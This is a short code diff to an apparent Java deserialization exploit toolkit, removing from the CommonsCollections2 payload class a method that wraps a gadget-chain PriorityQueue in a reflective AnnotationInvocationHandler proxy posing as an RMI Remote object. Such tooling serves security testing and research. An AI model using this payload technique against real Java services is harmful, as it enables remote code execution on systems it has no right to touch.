@@ -36,18 +36,5 @@ public class CommonsCollections2  implements PayloadType {
         return queue;
     }
 
-    @Override
-    public Object getRemoteObject(String command) throws Exception {
-        PriorityQueue queue = getObject(command, false);
-        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
-        Constructor constructor = clazz.getDeclaredConstructors()[0];
-        constructor.setAccessible(true);
-        Map map1 = Reflections.createMap("handlerHashset", queue);
-        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, map1);
 
-        Remote remote = Remote.class.cast(Proxy.newProxyInstance(
-                Remote.class.getClassLoader(),
-                new Class[]{Remote.class}, handler));
-        return remote;
-    }
 }
